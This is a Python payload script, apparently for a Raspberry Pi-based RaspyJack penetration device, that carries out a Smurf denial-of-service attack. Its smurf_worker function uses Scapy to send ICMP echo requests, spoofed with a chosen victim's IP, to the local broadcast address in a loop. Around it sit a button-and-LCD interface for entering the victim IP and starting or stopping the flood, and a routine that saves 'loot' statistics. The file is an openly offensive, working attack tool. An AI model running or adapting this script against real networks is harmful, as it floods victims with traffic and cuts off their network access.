#!/usr/bin/env python3
"""
RaspyJack *payload* – **DoS: Smurf Attack**
=========================================
This payload performs a Smurf Attack, a type of Denial of Service (DoS)
that relies on vulnerable network configurations (broadcast ping enabled).
It sends a large number of ICMP echo requests (pings) to a network's
broadcast address, with the source IP address spoofed to be the victim's IP.
This causes all hosts on the network to reply to the victim, potentially
overwhelming them and disrupting their network access.

Features:
- Interactive UI for entering the victim's IP address.
- Uses Scapy to craft and send spoofed ICMP packets to the broadcast address.
- Displays current status (ACTIVE/STOPPED) and packet count on the LCD.
- Graceful exit via KEY3 or Ctrl-C, ensuring the attack is stopped.
- Dynamically determines the active network interface and its broadcast IP.

Controls:
- MAIN SCREEN:
    - OK: Start Smurf Attack.
    - KEY1: Edit Victim IP.
    - KEY3: Exit Payload.
- IP INPUT SCREEN:
    - UP/DOWN: Change digit at cursor position.
    - LEFT/RIGHT: Move cursor.
    - OK: Confirm IP.
    - KEY3: Cancel IP input.
- ATTACKING SCREEN:
    - OK: Stop Attack.
    - KEY3: Stop Attack and Exit.
"""

import sys
import os
import time
import signal
import subprocess
import threading
from ipaddress import IPv4Address, IPv4Network

RASPYJACK_ROOT = '/root/Raspyjack' if os.path.isdir('/root/Raspyjack') else os.path.abspath(os.path.join(__file__, '..', '..'))
if RASPYJACK_ROOT not in sys.path:
    sys.path.insert(0, RASPYJACK_ROOT)
wifi_subdir = os.path.join(RASPYJACK_ROOT, 'wifi')
if os.path.isdir(wifi_subdir) and wifi_subdir not in sys.path:
    sys.path.insert(0, wifi_subdir)
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from wifi import raspyjack_integration as rji
from scapy.all import IP, ICMP, send, conf, get_if_addr, get_if_hwaddr, get_if_mask
conf.verb = 0

VICTIM_IP = "192.168.1.100"

LOOT_DIR = os.path.join(RASPYJACK_ROOT, 'loot', 'dos_smurf_attack')
os.makedirs(LOOT_DIR, exist_ok=True)

PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT_STATUS = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)
FONT = ImageFont.load_default()

running = True
attack_thread = None
attack_stop_event = threading.Event()
packet_count = 0
BROADCAST_IP = None
ATTACK_INTERFACE = None
current_ip_input = VICTIM_IP
ip_input_cursor_pos = 0

def cleanup(*_):
    global running
    if running:
        running = False
        attack_stop_event.set()
        if attack_thread and attack_thread.is_alive():
            attack_thread.join(timeout=2)
        save_loot_snapshot()
        print("Smurf Attack cleanup complete.", file=sys.stderr)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def save_loot_snapshot():
    """Save a loot snapshot with attack stats."""
    try:
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        loot_file = os.path.join(LOOT_DIR, f"smurf_attack_{timestamp}.txt")
        with open(loot_file, 'w') as f:
            f.write(f"Smurf Attack\n")
            f.write(f"Victim IP: {VICTIM_IP}\n")
            f.write(f"Broadcast IP: {BROADCAST_IP}\n")
            f.write(f"Interface: {ATTACK_INTERFACE}\n")
            f.write(f"Packets Sent: {packet_count}\n")
            f.write(f"Timestamp: {timestamp}\n")
        print(f"Loot saved to {loot_file}")
    except Exception as e:
        print(f"Error saving loot: {e}", file=sys.stderr)

def draw_ui(screen_state="main", status: str = "", message_lines=None):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "DoS: Smurf Attack", font=FONT_TITLE, fill="#FF0000")
    d.line([(0, 22), (128, 22)], fill="#FF0000", width=1)
    
    if message_lines:
        if isinstance(message_lines, str):
            message_lines = [message_lines]
        y_offset = (HEIGHT - len(message_lines) * 12) // 2
        for line in message_lines:
            bbox = d.textbbox((0, 0), line, font=FONT)
            w = bbox[2] - bbox[0]
            x = (WIDTH - w) // 2
            d.text((x, y_offset), line, font=FONT, fill="yellow")
            y_offset += 12
    elif screen_state == "main":
        d.text((5, 30), "Victim IP:", font=FONT, fill="white")
        d.text((5, 45), VICTIM_IP, font=FONT_TITLE, fill="yellow")
        d.text((5, 65), f"Broadcast: {BROADCAST_IP}", font=FONT, fill="white")
        d.text((5, 100), "OK=Start | KEY1=Edit IP", font=FONT, fill="cyan")
        d.text((5, 110), "KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "ip_input":
        d.text((5, 30), "Enter Victim IP:", font=FONT, fill="white")
        display_ip = list(current_ip_input)
        if ip_input_cursor_pos < len(display_ip):
            display_ip[ip_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_ip), font=FONT_TITLE, fill="yellow")
        d.text((5, 100), "UP/DOWN=Digit | LEFT/RIGHT=Move", font=FONT, fill="cyan")
        d.text((5, 110), "OK=Confirm | KEY3=Cancel", font=FONT, fill="cyan")
    elif screen_state == "attacking":
        status_color = "lime" if status == "ACTIVE" else "red"
        d.text((30, 35), status, font=FONT_STATUS, fill=status_color)
        d.text((5, 60), "Packets Sent:", font=FONT, fill="white")
        d.text((15, 75), str(packet_count), font=FONT_TITLE, fill="yellow")
        d.text((5, 100), "OK=Stop | KEY3=Exit", font=FONT, fill="cyan")
    
    LCD.LCD_ShowImage(img, 0, 0)

def handle_ip_input_logic(initial_ip):
    global current_ip_input, ip_input_cursor_pos
    current_ip_input = initial_ip
    ip_input_cursor_pos = len(initial_ip) - 1
    
    draw_ui("ip_input")
    
    last_button_press_time = 0
    BUTTON_DEBOUNCE_TIME = 0.3 # seconds

    while running:
        current_time = time.time()
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                btn = name
                last_button_press_time = current_time
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "KEY3":
            return None
        
        if btn == "OK":
            parts = current_ip_input.split('.')
            if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                return current_ip_input
            else:
                draw_ui(message_lines=["Invalid IP!", "Try again."])
                time.sleep(2)
                current_ip_input = initial_ip
                ip_input_cursor_pos = len(initial_ip) - 1
                draw_ui("ip_input")
        
        if btn == "LEFT":
            ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
            draw_ui("ip_input")
        elif btn == "RIGHT":
            ip_input_cursor_pos = min(len(current_ip_input), current_ip_input.find('.') if '.' in current_ip_input[ip_input_cursor_pos:] else len(current_ip_input), ip_input_cursor_pos + 1)
            draw_ui("ip_input")
        elif btn == "UP" or btn == "DOWN":
            if ip_input_cursor_pos < len(current_ip_input):
                char_list = list(current_ip_input)
                current_char = char_list[ip_input_cursor_pos]
                
                if current_char.isdigit():
                    digit = (int(current_char) + 1) % 10 if btn == "UP" else (int(current_char) - 1 + 10) % 10
                    char_list[ip_input_cursor_pos] = str(digit)
                    current_ip_input = "".join(char_list)
                elif current_char == '.':
                    if btn == "UP":
                        ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
                    else:
                        ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
                draw_ui("ip_input")
        
        time.sleep(0.05)
    return None

def get_broadcast_ip(interface):
    try:
        ip_addr = get_if_addr(interface)
        net_mask = get_if_mask(interface)
        if ip_addr and net_mask:
            network = IPv4Network(f"{ip_addr}/{net_mask}", strict=False)
            return str(network.broadcast_address)
    except Exception as e:
        print(f"Error getting broadcast IP for {interface}: {e}", file=sys.stderr)
        draw_ui(message_lines=[f"Error getting broadcast IP for {interface}", f"{str(e)[:20]}"])
        time.sleep(3)
    return None

def smurf_worker(victim_ip, broadcast_ip, interface):
    global packet_count, attack_stop_event
    
    p = IP(src=victim_ip, dst=broadcast_ip) / ICMP()
    
    try:
        while not attack_stop_event.is_set():
            send(p, iface=interface, verbose=0)
            packet_count += 1
            time.sleep(0.5)
    except Exception as e:
        print(f"[ERROR] Smurf Attack worker failed: {e}", file=sys.stderr)
        draw_ui(message_lines=[f"Attack failed!", f"{str(e)[:20]}"])
        attack_stop_event.set() # Stop the attack on error

def start_attack():
    global attack_thread, packet_count, BROADCAST_IP, ATTACK_INTERFACE
    if attack_thread and attack_thread.is_alive():
        return False

    interface = rji.get_best_interface()
    if not interface:
        draw_ui(message_lines=["No active network", "interface found!"])
        time.sleep(3)
        return False
    ATTACK_INTERFACE = interface

    broadcast_ip = get_broadcast_ip(ATTACK_INTERFACE)
    if not broadcast_ip:
        draw_ui(message_lines=["Could not determine", "broadcast IP!", "Check interface."])
        time.sleep(3)
        return False
    BROADCAST_IP = broadcast_ip

    packet_count = 0
    attack_stop_event.clear()
    attack_thread = threading.Thread(target=smurf_worker, args=(VICTIM_IP, BROADCAST_IP, ATTACK_INTERFACE), daemon=True)
    attack_thread.start()
    return True

def stop_attack():
    attack_stop_event.set()
    if attack_thread:
        attack_thread.join(timeout=2)

if __name__ == "__main__":
    try:
        # Check if Scapy is installed
        try:
            from scapy.all import IP
        except ImportError:
            draw_ui(message_lines=["Scapy not found!", "Install with:", "`pip install scapy`"])
            time.sleep(5)
            raise SystemExit("Scapy not found.")

        current_screen = "main"
        last_button_press_time = 0
        BUTTON_DEBOUNCE_TIME = 0.3 # seconds

        # Initial determination of broadcast IP for display
        ATTACK_INTERFACE = rji.get_best_interface()
        if ATTACK_INTERFACE:
            BROADCAST_IP = get_broadcast_ip(ATTACK_INTERFACE)
        if not BROADCAST_IP:
            BROADCAST_IP = "N/A" # Display N/A if not found initially

        while running:
            current_time = time.time()
            
            if current_screen == "main":
                draw_ui("main")
                
                if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    cleanup()
                    break
                
                if GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    if start_attack():
                        current_screen = "attacking"
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                
                if GPIO.input(PINS["KEY1"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    current_ip_input = VICTIM_IP
                    current_screen = "ip_input"
                    time.sleep(BUTTON_DEBOUNCE_TIME)
            
            elif current_screen == "ip_input":
                new_ip = handle_ip_input_logic(current_ip_input)
                if new_ip:
                    VICTIM_IP = new_ip
                current_screen = "main"
                time.sleep(BUTTON_DEBOUNCE_TIME)
            
            elif current_screen == "attacking":
                draw_ui("attacking", "ACTIVE")
                if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    stop_attack()
                    cleanup()
                    break
                if GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    stop_attack()
                    current_screen = "main"
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                time.sleep(0.1)

            time.sleep(0.05)

    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)
        draw_ui(message_lines=["An error occurred.", str(e)[:20]])
        time.sleep(3)
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Smurf Attack payload finished.")